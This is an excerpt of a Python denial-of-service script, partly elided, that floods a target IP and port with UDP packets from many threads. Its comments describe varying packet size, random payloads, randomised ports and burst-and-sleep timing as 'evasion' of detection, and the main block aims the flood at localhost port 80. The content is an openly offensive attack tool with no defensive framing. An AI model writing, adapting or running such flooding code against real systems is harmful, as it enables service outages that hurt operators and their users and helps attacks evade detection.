...
def udp_worker(target_ip, target_port, packet_size, stop_time, randomize_ports, burst, sleep, stats):
    """
    ...
    while time.time() < stop_time:
        for _ in range(burst):
            ...
            try:
                ...
                size = random.randint(512, packet_size)  # Evasion: vary size
                payload = random._urandom(size)  # Evasion: fake data/payload
                sock.sendto(payload, (target_ip, port))
                stats["sent"] += 1
            except Exception:
                continue
        time.sleep(sleep)  # Burst + sleep for evasion
...
def udp_flood(
    ...
    print(f"[ UDP Flood ] Threads       : {num_threads} (auto)" if num_threads <= 0 else f"[ UDP Flood ] Threads       : {num_threads}")
    ...
    for _ in range(num_threads):
        t = threading.Thread(
            target=udp_worker,
            args=(target_ip, target_port, packet_size, stop_time, randomize_ports, burst, sleep, stats)
        )
        t.daemon = True
        threads.append(t)
        t.start()
...
if __name__ == "__main__":
    ...
    udp_flood("127.0.0.1", 80, duration=10, packet_size=1024, num_threads=0, randomize_ports=True, burst=200, sleep=1)
